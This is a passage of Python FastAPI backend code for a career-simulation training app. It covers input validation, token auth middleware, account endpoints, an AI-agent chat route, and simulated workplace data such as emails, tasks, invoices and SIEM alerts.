_HTML_BLOCK_RE = re.compile(r"(?is)<(script|style|noscript|svg|iframe|object|embed)[^>]*>.*?</\1>")
_HTML_TAG_RE = re.compile(r"(?s)<[^>]+>")

def _strip_user_html(v: Any) -> Any:
    if not isinstance(v, str):
        return v
    s = _HTML_BLOCK_RE.sub(" ", v)
    s = _HTML_TAG_RE.sub("", s)
    return s.strip()

SafeStr = Annotated[str, BeforeValidator(_strip_user_html)]
SafeOptStr = Annotated[Optional[str], BeforeValidator(_strip_user_html)]

class ChatReq(BaseModel):
    message: SafeStr = Field(..., min_length=1, max_length=2000)

class CareerReq(BaseModel):
    career: str = Field(..., pattern=r"^(accountant|cybersecurity|marketing|developer|procurement|hr|pm)$")
    experience_level: str = Field("experienced", pattern=r"^(experienced|studied|beginner)$")

class ReplyReq(BaseModel):
    email_id: str = Field(..., min_length=1, max_length=64)
    text: SafeStr = Field(..., min_length=1, max_length=10000)

class SignupReq(BaseModel):
    email: str = Field(..., min_length=3, max_length=254)
    password: str = Field(..., min_length=8, max_length=128)
    name: SafeOptStr = Field("", max_length=100)
    consent: bool = False

    @field_validator("email")
    @classmethod
    def _email_format(cls, v: str) -> str:
        v = v.strip().lower()
        if not EMAIL_RE.match(v):
            raise ValueError("Invalid email format")
        return v

class LoginReq(BaseModel):
    email: str = Field(..., min_length=3, max_length=254)
    password: str = Field(..., min_length=1, max_length=128)

    @field_validator("email")
    @classmethod
    def _email_lc(cls, v: str) -> str:
        return v.strip().lower()

class JournalReq(BaseModel):
    date: str
    acc: str
    desc: SafeStr = Field(..., max_length=500)
    dr: float = Field(0.0, ge=0)
    cr: float = Field(0.0, ge=0)
    ref: SafeOptStr = Field("", max_length=64)

class JiraUpdateReq(BaseModel):
    status: Optional[str] = None        # open | in_progress | in_review | closed
    resolution: Optional[str] = None    # fixed | wont_fix | false_positive | duplicate
    assignee: Optional[str] = None
    comment: SafeOptStr = Field(None, max_length=4000)
    priority: Optional[str] = None

class InvoiceResolveReq(BaseModel):
    resolved_amount: float = Field(..., ge=0)
    note: SafeOptStr = Field("", max_length=2000)

class CampaignUpdateReq(BaseModel):
    content: SafeOptStr = Field(None, max_length=10000)
    brand_colour: Optional[str] = None
    tone: SafeOptStr = Field(None, max_length=200)
    status: Optional[str] = None  # in_progress | scheduled | live | paused

# ── ERROR ENVELOPE HELPERS ────────────────────────────────────────
APP_VERSION = os.environ.get("APP_VERSION", "0.1.0")

def _err(code: str, message: str, status: int = 400, **extra) -> JSONResponse:
    """Single source of truth for JSON error responses."""
    body = {"error": {"code": code, "message": message, "request_id": _request_id_var.get(), **extra}}
    return JSONResponse(body, status_code=status)

@app.exception_handler(HTTPException)
async def _on_http_exc(request: Request, exc: HTTPException):
    log.info("http_exception status=%s detail=%s path=%s", exc.status_code, exc.detail, request.url.path)
    code = {400: "bad_request", 401: "unauthorized", 402: "upgrade_required",
            403: "forbidden", 404: "not_found", 409: "conflict",
            429: "rate_limited", 503: "service_unavailable"}.get(exc.status_code, "http_error")
    # Preserve structured dict details (e.g. paywall payload with feature flag).
    if isinstance(exc.detail, dict):
        extra = {k: v for k, v in exc.detail.items() if k not in ("error", "message")}
        return _err(exc.detail.get("error") or code,
                    exc.detail.get("message") or "Request failed.",
                    status=exc.status_code, **extra)
    return _err(code, str(exc.detail) if exc.detail else "Request failed.", status=exc.status_code)

@app.exception_handler(RequestValidationError)
async def _on_validation_exc(request: Request, exc: RequestValidationError):
    # Pydantic v2 error ctx can contain non-JSON-safe objects (e.g. ValueError).
    # Strip ctx and coerce remaining fields to strings to keep the response serialisable.
    safe_errors = []
    for e in exc.errors():
        d = {k: v for k, v in e.items() if k != "ctx"}
        for k, v in list(d.items()):
            if not isinstance(v, (str, int, float, bool, list, dict, type(None))):
                d[k] = str(v)
        safe_errors.append(d)
    log.info("validation_error path=%s errors=%s", request.url.path, safe_errors[:3])
    return _err("validation_error", "Invalid request payload.", status=422, details=safe_errors)

@app.exception_handler(PyMongoError)
async def _on_mongo_exc(request: Request, exc: PyMongoError):
    log.exception("mongo_error path=%s kind=%s", request.url.path, type(exc).__name__)
    return _err("database_unavailable", "Database is temporarily unavailable. Please retry.", status=503)

@app.exception_handler(Exception)
async def _on_unhandled_exc(request: Request, exc: Exception):
    log.exception("unhandled_exception path=%s kind=%s", request.url.path, type(exc).__name__)
    return _err("internal_error", "Something went wrong on our end.", status=500)

# ── REQUEST ID MIDDLEWARE ─────────────────────────────────────────
@app.middleware("http")
async def request_id_middleware(request: Request, call_next):
    rid = request.headers.get("X-Request-Id") or secrets.token_hex(6)
    token = _request_id_var.set(rid)
    started = time.perf_counter()
    try:
        response = await call_next(request)
    finally:
        elapsed_ms = int((time.perf_counter() - started) * 1000)
        log.info("http %s %s status=%s took_ms=%d",
                 request.method, request.url.path,
                 getattr(locals().get("response"), "status_code", "-"), elapsed_ms)
        _request_id_var.reset(token)
    response.headers["X-Request-Id"] = rid
    return response

# ── AUTH MIDDLEWARE ───────────────────────────────────
# Open paths (no auth required): static assets + auth endpoints + healthcheck
_OPEN_PREFIXES = ("/api/auth/",)

_OPEN_PATHS = {"/api/health", "/api/healthz", "/api/readyz", "/api/openapi.json", "/api/docs"}

# In-memory TTL cache for user + progress lookups. Cuts 2 blocking Mongo
# round-trips off the hot path per protected request. Invalidated on logout
# / account delete via _invalidate_user_cache.
_user_cache: "dict[str, tuple[float, dict, dict]]" = {}
_USER_CACHE_TTL = 30  # seconds

def _invalidate_user_cache(uid: str) -> None:
    _user_cache.pop(uid, None)

@app.middleware("http")
async def auth_and_scope(request: Request, call_next):
    path = request.url.path
    # Static assets, healthchecks, docs, and auth endpoints are open.
    if not path.startswith("/api/") or path.startswith(_OPEN_PREFIXES) or path in _OPEN_PATHS:
        return await call_next(request)
    # Verify token first — token decode is cheap (HMAC). Only hit Mongo if uncached.
    auth_hdr = request.headers.get("authorization") or ""
    _uid = None
    if auth_hdr.lower().startswith("bearer "):
        _uid = _verify_token(auth_hdr.split(" ", 1)[1].strip())
    if not _uid:
        return _err("unauthorized", "Sign in to continue.", status=401)
    # TTL cache eliminates 2 blocking Mongo round-trips per request for the
    # same user inside the TTL window.
    _now = time.time()
    _cached = _user_cache.get(_uid)
    if _cached and (_now - _cached[0]) < _USER_CACHE_TTL:
        user, prog = _cached[1], _cached[2]
    else:
        user = users_col.find_one({"user_id": _uid}, {"_id": 0, "password_hash": 0})
        if not user:
            return _err("unauthorized", "Sign in to continue.", status=401)
        prog = progress_col.find_one({"user_id": _uid}) or {}
        _user_cache[_uid] = (_now, user, prog)
    # Per-request scope: contextvars are isolated to this request's task.
    set_scope(_uid)
    saved_career = prog.get("current_career")
    if saved_career:
        _career_var.set(saved_career)
        if get_orchestrator() is None:
            async with _orchestrator_lock:
                if get_orchestrator() is None:  # double-check after acquire
                    try:
                        set_orchestrator(create_orchestrator(saved_career))
                        log.info("auth.orchestrator_created user=%s career=%s", user["user_id"], saved_career)
                    except Exception as ex:
                        log.exception("auth.orchestrator_create_failed user=%s career=%s kind=%s",
                                      user["user_id"], saved_career, type(ex).__name__)
    request.state.user = user
    return await call_next(request)

# ── AUTH ENDPOINTS ────────────────────────────────────
@app.post("/api/auth/signup", response_model=TokenOut, responses={409: {"model": ErrorEnvelope}})
@app.post("/api/auth/register", response_model=TokenOut, responses={409: {"model": ErrorEnvelope}})
async def auth_signup(req: SignupReq) -> TokenOut:
    _ensure_bootstrap()
    email = req.email.strip().lower()
    if not EMAIL_RE.match(email):
        raise HTTPException(400, "Please enter a valid email address.")
    if not req.consent:
        raise HTTPException(400, "Please agree to the Privacy Policy to continue.")
    if users_col.find_one({"email": email}):
        raise HTTPException(409, "An account with that email already exists.")
    user_id = "u_" + secrets.token_hex(8)
    now = datetime.utcnow().isoformat()
    u = {
        "user_id": user_id,
        "email": email,
        "name": (req.name or "").strip()[:80],
        "password_hash": _hash_pw(req.password),
        "created_at": now,
        "consent_given": True,
        "consent_at": now,
        "is_guest": False,
    }
    users_col.insert_one(u)
    progress_col.insert_one({
        "user_id": user_id, "current_career": None, "current_day": 0,
        "days_completed": 0, "cumulative_score": 0,
        "started_at": datetime.utcnow().isoformat(),
    })
    log.info("auth.signup user=%s", user_id)
    try: analytics_col.insert_one({"event": "user_registered", "user_id": user_id, "data": {}, "ts": now})
    except Exception: pass
    return TokenOut(token=_make_token(user_id), user=_public_user(u),
                    progress={"current_career": None, "current_day": 0})

@app.post("/api/auth/signin", response_model=TokenOut, responses={401: {"model": ErrorEnvelope}})
@app.post("/api/auth/login", response_model=TokenOut, responses={401: {"model": ErrorEnvelope}})
async def auth_login(req: LoginReq) -> TokenOut:
    _ensure_bootstrap()
    email = req.email.strip().lower()
    u = users_col.find_one({"email": email})
    if not u or not _verify_pw(req.password, u.get("password_hash", "")):
        # Constant-time-ish: same message for both branches, so we don't leak which side failed.
        raise HTTPException(401, "Invalid email or password.")
    prog = progress_col.find_one({"user_id": u["user_id"]}, {"_id": 0}) or {}
    log.info("auth.login user=%s", u["user_id"])
    try: analytics_col.insert_one({"event": "user_logged_in", "user_id": u["user_id"], "data": {}, "ts": datetime.utcnow().isoformat()})
    except Exception: pass
    return {"token": _make_token(u["user_id"]), "user": _public_user(u),
            "progress": {"current_career": prog.get("current_career"), "current_day": prog.get("current_day", 0)}}

@app.get("/api/auth/me")
async def auth_me(authorization: Optional[str] = Header(None)):
    user = _user_from_auth(authorization)
    if not user:
        raise HTTPException(401, "Unauthorized")
    prog = progress_col.find_one({"user_id": user["user_id"]}, {"_id": 0}) or {}
    return {"user": _public_user(user),
            "progress": {"current_career": prog.get("current_career"), "current_day": prog.get("current_day", 0),
                         "cumulative_score": prog.get("cumulative_score", 0)}}

@app.post("/api/auth/logout")
async def auth_logout():
    # Stateless tokens — client just discards. Endpoint exists for symmetry.
    return {"ok": True}

@app.post("/api/auth/guest", response_model=TokenOut)
async def auth_guest() -> TokenOut:
    """Throwaway guest session. Progress is real but flagged is_guest=True so the
    frontend can show a 'Register to save' banner. Tokens still expire in 7 days."""
    _ensure_bootstrap()
    user_id = "g_" + secrets.token_hex(8)
    now = datetime.utcnow().isoformat()
    u = {
        "user_id": user_id,
        "email": f"{user_id}@guest.local",
        "name": "Guest",
        "password_hash": "",
        "created_at": now,
        "consent_given": False,
        "is_guest": True,
    }
    users_col.insert_one(u)
    progress_col.insert_one({
        "user_id": user_id, "current_career": None, "current_day": 0,
        "days_completed": 0, "cumulative_score": 0,
        "started_at": now, "is_guest": True,
    })
    log.info("auth.guest user=%s", user_id)
    return TokenOut(token=_make_token(user_id), user={**_public_user(u), "is_guest": True},
                    progress={"current_career": None, "current_day": 0, "is_guest": True})

# Collections that hold per-user data. Used by /api/profile/history and DELETE /api/auth/account.
_USER_DATA_COLS_BY_USER_ID = ("progress_col", "interviews_col", "user_scenarios_col")
_USER_DATA_COLS_BY_SIM_ID = (
    "emails_col", "tasks_col", "sheets_col", "invoices_col", "evals_col",
    "memory_col", "actions_col", "agent_comms_col",
    "system_events_col", "siem_col", "jira_col", "campaigns_col",
    "reputation_col", "slack_col", "tools_col",
)
# sessions_col stores its sim handle under the field `sim_id`, not `simulation_id`,
# and its primary key is session_id. Deleted separately by session_id.
_USER_DATA_COLS_BY_SESSION_ID = ("sessions_col",)

class TrackReq(BaseModel):
    kind: str = Field(..., pattern=r"^(tool_switch|email_open|idle|focus_blur|custom)$", max_length=32)
    ref: Optional[str] = Field(None, max_length=120)

@app.post("/api/track")
async def api_track(req: TrackReq):
    """Lightweight client-side telemetry. Used to compute behavioural fingerprint
    (tool switches, idle/focus blur, etc.). Always returns 200 so the UI never
    has to handle errors here."""
    try:
        actions_col.insert_one({
            "simulation_id": sim_id(),
            "kind": req.kind,
            "ref": req.ref,
            "ts": datetime.utcnow().isoformat(),
        })
    except Exception:
        pass
    return {"status": "ok"}

@app.get("/api/profile/fingerprint")
async def api_fingerprint():
    """Behavioural fingerprint for the user's current/most-recent simulation."""
    s = sessions_col.find_one({"session_id": session_id()}, {"_id": 0}) or {}
    sim = sim_id()
    return _compute_behavioral_fingerprint(s, sim)

@app.get("/api/profile/history")
async def profile_history(request: Request):
    """Past sims (best score per career) + past interviews + aggregate
    employability score. Used by the post-login dashboard."""
    user = request.state.user
    uid = user["user_id"]
    _sim_id = f"sim_{uid}"

    # Sims: end-of-day reviews. Group by career, take best score.
    by_career: dict[str, dict] = {}
    for r in evals_col.find(
        {"simulation_id": _sim_id, "type": "end_of_day_review"},
        {"_id": 0, "career": 1, "total_score": 1, "ts": 1, "level": 1},
    ):
        career = r.get("career") or "unknown"
        score = int(r.get("total_score") or 0)
        prev = by_career.get(career)
        if prev is None or score > prev["score"]:
            by_career[career] = {
                "id": f"sim_{uid}_{career}",
                "career": career,
                "score": score,
                "level": r.get("level") or "",
                "date": (r.get("ts") or "")[:10],
            }
    simulations = sorted(by_career.values(), key=lambda x: x["date"], reverse=True)

    interviews_raw = list(interviews_col.find(
        {"user_id": uid, "status": "completed"},
        {"_id": 0, "id": 1, "role_title": 1, "scores": 1, "created_at": 1, "completed_at": 1},
    ))
    interviews = []
    for i in interviews_raw:
        sc = (i.get("scores") or {})
        interviews.append({
            "id": i.get("id"),
            "role": i.get("role_title") or "Role",
            "score": int(sc.get("employability_score") or sc.get("total") or 0),
            "date": (i.get("completed_at") or i.get("created_at") or "")[:10],
        })
    interviews.sort(key=lambda x: x["date"], reverse=True)

    # Employability: average of (best sim score, best interview score). If only one
    # category has data, use that. If neither, 0. Clamped to 0..100.
    best_sim = max((s["score"] for s in simulations), default=None)
    best_int = max((i["score"] for i in interviews), default=None)
    parts = [v for v in (best_sim, best_int) if v is not None]
    employability = int(round(sum(parts) / len(parts))) if parts else 0

    return {
        "simulations": simulations,
        "interviews": interviews,
        "employability_score": employability,
        "is_guest": bool(user.get("is_guest")),
    }

@app.delete("/api/auth/account")
async def auth_delete_account(authorization: Optional[str] = Header(None)):
    """Delete the authenticated user and all data they generated. Irreversible.
    Auth is enforced inline because the global middleware treats /api/auth/* as open."""
    user = _user_from_auth(authorization)
    if not user:
        raise HTTPException(401, "Unauthorized")
    uid = user["user_id"]
    _sim_id = f"sim_{uid}"
    _sess_id = f"sess_{uid}"
    deleted = {}
    for name in _USER_DATA_COLS_BY_SIM_ID:
        col = globals().get(name)
        if col is None: continue
        r = col.delete_many({"simulation_id": _sim_id})
        deleted[name] = r.deleted_count
    for name in _USER_DATA_COLS_BY_USER_ID:
        col = globals().get(name)
        if col is None: continue
        r = col.delete_many({"user_id": uid})
        deleted[name] = r.deleted_count
    for name in _USER_DATA_COLS_BY_SESSION_ID:
        col = globals().get(name)
        if col is None: continue
        r = col.delete_many({"session_id": _sess_id})
        deleted[name] = r.deleted_count
    # Per-process caches keyed by user_id.
    _user_orchestrators.pop(uid, None)
    _user_chat_history.pop(uid, None)
    _user_locks.pop(uid, None)
    users_col.delete_one({"user_id": uid})
    _invalidate_user_cache(uid)
    log.info("auth.account_deleted user=%s totals=%s", uid, deleted)
    return {"ok": True, "deleted": deleted}

@app.post("/api/start")
async def start_career(req: CareerReq, request: Request):
    if req.career not in CAREER_CONFIGS:
        return {"error": f"Unknown career: {req.career}. Options: {list(CAREER_CONFIGS.keys())}"}
    user = request.state.user
    _career_var.set(req.career)
    reset_chat_history()
    clear_sim()
    cfg = CAREER_CONFIGS[req.career]

    # Try the adaptive scenario engine first. If the bank is empty for this
    # career or the user has seen them all, fall back to the hard-coded seed.
    used_engine = False
    scenario_summary = None
    try:
        engine = get_scenario_engine()
        scenario_summary = engine.start_for_user(user["user_id"], req.career, sim_id())
        used_engine = scenario_summary is not None
    except Exception as ex:
        log.warning("start.scenario_engine_failed user=%s career=%s kind=%s msg=%s",
                    user["user_id"], req.career, type(ex).__name__, ex)

    if not used_engine:
        SEED_FUNCTIONS[req.career](cfg)
        log.info("start.fallback_seed user=%s career=%s", user["user_id"], req.career)
    else:
        # Scenario engine seeds emails/tasks/slack/tools but not career-specific
        # rich data (Sage spreadsheets, SIEM alerts). Top those up so the deep
        # tabs always have content regardless of which path produced the scenario.
        if req.career == "accountant":
            _seed_accountant_artifacts(cfg)
        elif req.career == "developer":
            _seed_developer_artifacts(cfg)
        elif req.career == "marketing":
            _seed_marketing_artifacts(cfg)
        elif req.career == "procurement":
            _seed_procurement_artifacts(cfg)
        elif req.career == "hr":
            _seed_hr_artifacts(cfg)
        elif req.career == "pm":
            _seed_pm_artifacts(cfg)
        elif req.career == "cybersecurity":
            _seed_cybersecurity_artifacts(cfg)

    _tag_day1_artifacts()
    init_session(req.career, req.experience_level)
    init_reputation()
    set_orchestrator(create_orchestrator(req.career, req.experience_level))
    progress_col.update_one(
        {"user_id": user["user_id"]},
        {"$set": {"current_career": req.career, "current_day": 1, "started_career_at": datetime.utcnow().isoformat()}},
        upsert=True,
    )
    _invalidate_user_cache(user["user_id"])
    try: analytics_col.insert_one({"event": "simulation_started", "user_id": user["user_id"],
                                   "data": {"career": req.career, "level": req.experience_level,
                                            "source": "adaptive_engine" if used_engine else "hard_coded_seed"},
                                   "ts": datetime.utcnow().isoformat()})
    except Exception: pass
    return {
        "status": "started", "career": req.career,
        "title": cfg["title"],
        "company": (scenario_summary or {}).get("company", cfg["company"]),
        "tools": list((scenario_summary or {}).get("tools_palette") or cfg["tools"]),
        "scenario": scenario_summary,
        "source": "adaptive_engine" if used_engine else "hard_coded_seed",
    }

@app.post("/api/chat")
async def chat(req: ChatReq, request: Request, background: BackgroundTasks):
    user = request.state.user
    if not _check_rate_limit(_client_ip(request)):
        raise HTTPException(429, "Slow down — too many messages. Please wait a moment.")
    orc = get_orchestrator()
    if not orc:
        log.warning("chat.no_orchestrator user=%s career=%s", user["user_id"], get_career())
        return {"response": "[setup error] No orchestrator loaded — pick a career first.", "error": "no_orchestrator"}
    sid = session_id()
    sm = sim_id()
    career = get_career()
    sessions_col.update_one({"session_id": sid}, {"$inc": {"interaction_count": 1}})
    actions_col.insert_one({"simulation_id": sm, "action": req.message[:200], "ts": datetime.utcnow().isoformat()})
    # Tone classifier + escalation run async — they're observability, not on the hot reply path.
    # We pass the captured scope explicitly because BackgroundTasks runs in a fresh contextvars copy.
    def _observe_and_escalate(msg: str, sm_: str, sid_: str, career_: Optional[str], uid_: str):
        _sim_id_var.set(sm_)
        _session_id_var.set(sid_)
        _career_var.set(career_)
        _user_id_var.set(uid_)
        observe_tone(msg)
        check_escalations()
    background.add_task(_observe_and_escalate, req.message, sm, sid, career, user["user_id"])
    # Check system events
    session = sessions_col.find_one({"session_id": sid})
    ic = session.get("interaction_count", 0) if session else 0
    events = list(system_events_col.find({"simulation_id": sm}))
    for ev in events:
        if not ev.get("triggered") and ic >= ev.get("trigger_at", 999):
            system_events_col.update_one({"id": ev["id"]}, {"$set": {"triggered": True}})
            cfg = CAREER_CONFIGS[career]
            eid = f"e_{uuid.uuid4().hex[:6]}"
            emails_col.insert_one({"id": eid, "simulation_id": sm, "from_name": cfg["it"]["name"], "from_role": cfg["it"]["role"], "from_email": cfg["it"]["email"], "to": "all", "subject": f"⚠️ {ev['start_msg']}", "body": ev["start_msg"], "time": datetime.utcnow().strftime("%H:%M"), "read": False, "replied": False, "priority": "high", "category": "system", "requires_action": False})
            sessions_col.update_one({"session_id": sid}, {"$set": {"it_outage_active": True}})
        if ev.get("triggered") and not ev.get("resolved") and ev.get("end_at") and ic >= ev["end_at"]:
            system_events_col.update_one({"id": ev["id"]}, {"$set": {"resolved": True}})
            cfg = CAREER_CONFIGS[career]
            eid = f"e_{uuid.uuid4().hex[:6]}"
            emails_col.insert_one({"id": eid, "simulation_id": sm, "from_name": cfg["it"]["name"], "from_role": cfg["it"]["role"], "from_email": cfg["it"]["email"], "to": "all", "subject": f"✅ {ev['end_msg']}", "body": ev["end_msg"], "time": datetime.utcnow().strftime("%H:%M"), "read": False, "replied": False, "priority": "low", "category": "system", "requires_action": False})
            sessions_col.update_one({"session_id": sid}, {"$set": {"it_outage_active": False}})

    history = get_chat_history()
    # LangGraph react agent takes a single `messages` list. History tuples
    # like ("human", "...") / ("ai", "...") are accepted directly.
    messages_in = list(history) + [("human", req.message)]
    try:
        result = orc.invoke({"messages": messages_in})
    except Exception as ex:
        log.exception("chat.invoke_crashed kind=%s", type(ex).__name__)
        kind = type(ex).__name__
        msg = str(ex).lower()
        # Upstream LLM quota / rate limit — give the user a clear, actionable message
        # without leaking the provider's raw JSON envelope.
        if kind == "RateLimitError" or "rate_limit_exceeded" in msg or "rate limit" in msg or "quota" in msg:
            return {"response": "The AI service is temporarily rate-limited. Please wait a moment and try again.", "error": "upstream_rate_limited"}
        # Anything else → generic message, real details only in logs.
        return {"response": "Something went wrong reaching the AI service. Please try again in a moment.", "error": "orchestrator_failed"}
    msgs = result.get("messages") or []
    log.debug("chat.result message_count=%d", len(msgs))
    # Log the trace — tool calls + tool results — for parity with the old
    # intermediate_steps logging. Each ToolMessage / AIMessage(tool_calls=...) is a step.
    for i, m in enumerate(msgs[len(messages_in):]):
        mtype = getattr(m, "type", m.__class__.__name__)
        tcs = getattr(m, "tool_calls", None)
        if tcs:
            log.debug("chat.step idx=%d kind=%s tool_calls=%r", i, mtype, [(tc.get("name"), tc.get("args")) for tc in tcs])
        else:
            content_preview = str(getattr(m, "content", "") or "")[:200]
            log.debug("chat.step idx=%d kind=%s content=%r", i, mtype, content_preview)
    # Final AI reply is the last message's content.
    final_msg = msgs[-1] if msgs else None
    resp = (getattr(final_msg, "content", "") if final_msg else "") or "[empty output from agent — see server logs]"
    cleaned = _clean_tool_json(resp)
    if cleaned != resp:
        log.info("chat.tool_json_unwrapped preview=%r", cleaned[:120])
    resp = cleaned
    memory_col.insert_one({"session_id": sid, "role": "human", "content": req.message, "ts": datetime.utcnow().isoformat()})
    memory_col.insert_one({"session_id": sid, "role": "ai", "content": resp, "ts": datetime.utcnow().isoformat()})
    history.append(("human", req.message))
    history.append(("ai", resp))
    # Trim chat_history to last 40 turns to keep token usage bounded over a long day
    if len(history) > 80:
        del history[:len(history)-80]
    return {"response": resp}

@app.post("/api/email/{email_id}/read")
async def api_mark_read(email_id: str):
    emails_col.update_one({"id": email_id, "simulation_id": sim_id()}, {"$set": {"read": True}})
    sessions_col.update_one({"session_id": session_id()}, {"$addToSet": {"emails_read": email_id}})
    actions_col.insert_one({"simulation_id": sim_id(), "kind": "email_open", "email_id": email_id,
                            "ts": datetime.utcnow().isoformat()})
    return {"status": "ok"}

@app.get("/api/sent")
async def api_sent():
    """Return the user's sent items — every email where `replied=True`, rendered
    as a sent-mail row addressed to the original sender. Drives the Outlook
    Sent Items folder."""
    docs = list(emails_col.find(
        {"simulation_id": sim_id(), "replied": True},
        {"_id": 0, "id": 1, "from_name": 1, "from_email": 1, "from_role": 1,
         "subject": 1, "reply_text": 1, "reply_time": 1, "time": 1, "priority": 1},
    ))
    items = []
    for d in docs:
        subj = d.get("subject") or ""
        if not subj.lower().startswith("re:"):
            subj = "Re: " + subj
        items.append({
            "id": "sent-" + d["id"],
            "orig_email_id": d["id"],
            "to_name": d.get("from_name", ""),
            "to_email": d.get("from_email", ""),
            "to_role": d.get("from_role", ""),
            "subject": subj,
            "body": d.get("reply_text") or "",
            "time": d.get("reply_time") or d.get("time") or "",
            "priority": d.get("priority", "medium"),
        })
    # Most recent first
    items.sort(key=lambda x: x.get("time") or "", reverse=True)
    return {"sent": items}

@app.post("/api/reply")
async def api_reply(req: ReplyReq):
    """Direct email reply — bypasses chat. Marks replied, observes tone, generates an in-character follow-up."""
    if not get_career():
        return {"error": "No career active"}
    e = emails_col.find_one({"id": req.email_id, "simulation_id": sim_id()})
    if not e:
        return {"error": "Email not found"}
    emails_col.update_one(
        {"id": req.email_id, "simulation_id": sim_id()},
        {"$set": {"replied": True, "reply_text": req.text, "reply_time": datetime.utcnow().strftime("%H:%M")}},
    )
    sessions_col.update_one({"session_id": session_id()}, {"$addToSet": {"emails_replied": req.email_id}})
    actions_col.insert_one({"simulation_id": sim_id(), "kind": "email_reply", "email_id": req.email_id,
                            "action": f"reply:{req.email_id}:{req.text[:200]}",
                            "ts": datetime.utcnow().isoformat()})
    # Tone observer + escalations also apply to email replies
    observe_tone(req.text)
    check_escalations()
    # Compose an in-character follow-up unless it's an info-only sender (e.g. system events) or HR/Director (handled separately)
    cfg = CAREER_CONFIGS[get_career()]
    skip_followup = e.get("category") in ("system", "info") or e.get("from_role") in (cfg["hr"]["role"], cfg["director"]["role"])
    if not skip_followup:
        sender = {"name": e["from_name"], "role": e.get("from_role", ""), "email": e.get("from_email", "")}
        body = generate_followup(
            {"from_name": e["from_name"], "from_role": e.get("from_role", "")},
            cfg["company"], e["subject"], e.get("body", ""), req.text,
        )
        _push_email(sender, f"Re: {e['subject']}", body, priority=e.get("priority", "medium"), category="followup")
    return {"status": "sent", "email_id": req.email_id}

@app.post("/api/reset")
async def reset(request: Request):
    user = request.state.user
    reset_chat_history()
    set_orchestrator(None)
    _career_var.set(None)
    progress_col.update_one({"user_id": user["user_id"]}, {"$set": {"current_career": None}})
    clear_sim()
    return {"status": "reset"}

@app.get("/api/healthz", response_model=HealthOut)
async def healthz() -> HealthOut:
    """Liveness check. Doesn't touch Mongo so it stays green during DB blips."""
    return HealthOut(ok=True, ts=datetime.utcnow().isoformat(), version=APP_VERSION)

@app.get("/api/readyz")
async def readyz():
    """Readiness check. Pings Mongo so an orchestrator can decide whether to route traffic."""
    try:
        mongo.admin.command("ping")
    except Exception as ex:
        log.warning("readyz.mongo_unreachable kind=%s", type(ex).__name__)
        return _err("not_ready", "Database not reachable", status=503)
    return {"ok": True, "ts": datetime.utcnow().isoformat(), "version": APP_VERSION}

@app.get("/api/health")
async def health():
    """Public health endpoint. Reports DB connectivity without 503-ing."""
    db_status = "connected"
    try:
        mongo.admin.command("ping")
    except Exception as ex:
        log.warning("health.mongo_unreachable kind=%s", type(ex).__name__)
        db_status = "unreachable"
    return {"status": "ok" if db_status == "connected" else "degraded",
            "db": db_status, "version": APP_VERSION,
            "ts": datetime.utcnow().isoformat()}

@app.get("/api/careers")
async def list_careers():
    return {"careers": {k: {"title": v["title"], "company": v["company"], "tools": v["tools"]} for k, v in CAREER_CONFIGS.items()}}

@app.get("/api/inbox")
async def api_inbox():
    _day = _current_day()
    _sim = sim_id()
    # Parallelise the two blocking Mongo queries via to_thread so they overlap
    # on Atlas RTT instead of running serially on the asyncio loop.
    _q1 = asyncio.to_thread(lambda: list(emails_col.find({"simulation_id": _sim, "$or": [{"day": {"$lte": _day}}, {"day": {"$exists": False}}]}, {"_id": 0}).sort("time", 1)))
    _q2 = asyncio.to_thread(lambda: list(agent_comms_col.find({"simulation_id": _sim, "visible_to_user": True}, {"_id": 0}).sort("timestamp", 1)))
    mails, comms = await asyncio.gather(_q1, _q2)
    # Convert agent comms to email format for the frontend
    for c in comms:
        mails.append({"id": c["id"], "from_name": c["from_agent"], "from_role": f"→ {c['to_agent']} (CC: you)", "from_email": "", "to": c["to_agent"], "subject": c["subject"], "body": c["body"], "time": c.get("timestamp", ""), "read": False, "replied": False, "priority": "medium", "category": "agent_comm", "requires_action": False})
    return {"emails": mails}

@app.get("/api/tasks")
async def api_tasks():
    _day = _current_day()
    return {"tasks": list(tasks_col.find({"simulation_id": sim_id(), "$or": [{"day": {"$lte": _day}}, {"day": {"$exists": False}}]}, {"_id": 0}))}

@app.post("/api/task/{task_id}/complete")
async def api_complete_task(task_id: str):
    """User-side completion. Awards the small (20%) completion credit. The remaining
    80% only lands when the manager reviews the work via manager_review_task."""
    r = tasks_col.update_one(
        {"id": task_id, "simulation_id": sim_id(), "review_status": {"$ne": "approved"}},
        {"$set": {"status": "done", "review_status": "pending_review", "completed_at": datetime.utcnow().isoformat()}},
    )
    if r.modified_count == 0:
        return {"error": "not_found_or_already_approved"}
    t = tasks_col.find_one({"id": task_id}, {"_id": 0})
    completion_credit = max(2, int(t["points"] * 0.2))
    tasks_col.update_one({"id": task_id, "simulation_id": sim_id()}, {"$set": {"awarded_points": completion_credit}})
    sessions_col.update_one(
        {"session_id": session_id()},
        {"$addToSet": {"tasks_completed": task_id}, "$inc": {"score_adj": completion_credit}},
    )
    emit("task_completed", {"task": t})
    return {"ok": True, "task": t, "completion_credit": completion_credit, "awaiting_review": True,
            "message": f"+{completion_credit}pts completion credit. Manager will review your work for the rest."}

@app.get("/api/spreadsheet")
async def api_sheet():
    return sheets_col.find_one({"simulation_id": sim_id()}, {"_id": 0}) or {}

@app.get("/api/invoices")
async def api_invoices():
    _day = _current_day()
    return {"invoices": list(invoices_col.find({"simulation_id": sim_id(), "$or": [{"day": {"$lte": _day}}, {"day": {"$exists": False}}]}, {"_id": 0}).sort("date", 1))}

@app.get("/api/siem")
async def api_siem():
    return {"alerts": list(siem_col.find({"simulation_id": sim_id(), "day": {"$lte": _current_day()}}, {"_id": 0}))}

_DAY_PACK_COLS = {
    "emails": emails_col,
    "tasks": tasks_col,
    "invoices": invoices_col,
    "jira": jira_col,
    "campaigns": campaigns_col,
}

def _insert_day_pack(items: list[dict], col, nxt: int, _sim: str) -> int:
    """Idempotent insert: skip ids already present for this simulation."""
    if not items:
        return 0
    ids = [it["id"] for it in items if it.get("id")]
    existing = {d["id"] for d in col.find({"simulation_id": _sim, "id": {"$in": ids}}, {"id": 1})}
    to_insert = []
    for it in items:
        if it.get("id") and it["id"] in existing:
            continue
        row = dict(it)
        row["simulation_id"] = _sim
        row["day"] = nxt
        to_insert.append(row)
    if to_insert:
        col.insert_many(to_insert)
    return len(to_insert)

@app.post("/api/advance_day")
async def api_advance_day():
    """Bump the simulation cursor by one day. Inserts the day's pre-authored
    artefacts across all relevant collections. Returns the new current_day
    plus the count of items revealed."""
